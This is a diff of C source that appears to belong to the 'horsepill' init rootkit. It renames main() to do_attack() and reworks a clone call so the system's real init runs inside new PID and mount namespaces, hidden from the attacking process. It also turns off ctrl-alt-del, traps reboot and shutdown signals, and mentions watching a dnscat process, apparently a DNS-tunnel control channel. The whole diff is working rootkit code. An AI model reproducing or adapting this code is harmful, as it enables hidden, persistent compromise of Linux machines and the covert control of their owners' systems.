@@ -19,8 +19,23 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
+#include "horsepill.h"
+
 #ifndef __NR_clone3
 #define __NR_clone3 -1
+#endif
+
+#ifndef MS_RELATIME
+#define MS_RELATIME     (1<<21)
+#endif
+#ifndef MS_SLAVE
+#define MS_SLAVE	(1<<19)
+#endif
+#ifndef CLONE_NEWNS
+#define CLONE_NEWNS     0x00020000
+#endif
+#ifndef CLONE_NEWPID
+#define CLONE_NEWPID    0x20000000
 #endif
 
 #define err_exit(msg)                   \
@@ -32,11 +47,12 @@
 #define G3LBIN(x) (void)x
 #define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))
 
-pid_t init_pid;
+static pid_t init_pid;
 
-static pid_t sys_clone3(struct clone_args *args)
-{
-	return syscall(__NR_clone3, args, sizeof(struct clone_args));
+extern pid_t __clone(int, void *);
+
+static inline int raw_clone(unsigned long flags, void *child_stack) {
+	return __clone(flags, child_stack);
 }
 
 static void set_prctl_name(char *name)
@@ -190,11 +206,11 @@ static void handle_init_exit(int wstatus)
 
 		if (signum == SIGHUP) {
 			/* The system must be restarted */
-			G3LBIN(reboot(LINUX_REBOOT_CMD_RESTART));
+			G3LBIN(reboot(LINUX_REBOOT_CMD_RESTART, NULL));
 			snprintf(msg, 14, "cannot reboot");
 		} else if (signum == SIGINT) {
 			/* The system must be turned off */
-			G3LBIN(reboot(LINUX_REBOOT_CMD_POWER_OFF));
+			G3LBIN(reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL));
 			snprintf(msg, 16, "cannot shutdown");
 		} else {
 			snprintf(msg, 47,
@@ -209,18 +225,14 @@ static void handle_init_exit(int wstatus)
 	err_exit(msg);
 }
 
-int main()
+void do_attack()
 {
         int i;
         int num;
         int mountflags;
         char *kthreads_names[1024];
-        struct clone_args args = {0};
-
-	args.exit_signal = SIGCHLD;
-        args.flags = CLONE_NEWPID | CLONE_NEWNS;
         
-        init_pid = sys_clone3(&args);
+        init_pid = raw_clone(CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, NULL);
         if (init_pid < 0) {
                 err_exit("clone");
         } else if (init_pid == 0) {
@@ -246,7 +258,7 @@ int main()
 		 */
 		if (signal(SIGINT, on_sigint) == SIG_ERR)
 			err_exit("couldn't install signal handler");
-		if (reboot(LINUX_REBOOT_CMD_CAD_OFF) < 0)
+		if (reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL) < 0)
 			err_exit("couldn't turn cad off");
 
 		/* watching for dnscat exit
@@ -276,3 +288,4 @@ int main()
 		}
         }
 }
+
